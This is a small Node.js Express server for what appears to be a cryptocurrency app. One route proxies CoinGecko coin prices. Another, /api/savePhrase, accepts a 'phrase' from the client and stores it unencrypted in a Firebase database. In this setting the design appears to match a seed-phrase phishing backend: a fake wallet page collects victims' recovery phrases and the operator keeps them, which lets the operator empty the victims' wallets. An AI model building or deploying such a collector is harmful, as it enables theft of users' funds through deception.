const express = require('express');
const axios = require('axios');
const cors = require('cors');
const admin = require('firebase-admin');

const app = express();
const PORT = 5000;

//new

// Initialize Firebase Admin SDK
const serviceAccount = require('./firebaseServiceAccountKey.json');
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://xchange-97165-default-rtdb.firebaseio.com/"
});

app.use(cors());
app.use(express.json()); // To parse JSON bodies

app.get('/api/coins', async (req, res) => {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/coins/markets', {
        params: {
            vs_currency: 'usd',
            ids: 'bitcoin,ethereum,ripple,litecoin,bitcoin-cash,eos,binancecoin,tether,stellar,cardano,chainlink,polkadot',
        },
    });
    res.json(response.data);
  } catch (error) {
    res.status(500).json({ error: 'Error fetching coin data' });
  }
});

app.post('/api/savePhrase', async (req, res) => {
  const { phrase } = req.body;
  if (!phrase) {
    return res.status(400).json({ error: 'Phrase is required' });
  }

  try {
    const db = admin.database();
    const ref = db.ref('phrases').push();
    await ref.set({ phrase });
    res.status(200).json({ message: 'Phrase saved successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Error saving phrase' });
  }
});

app.listen(PORT, () => {
  console.log(`Proxy server running on http://localhost:${PORT}`);
});
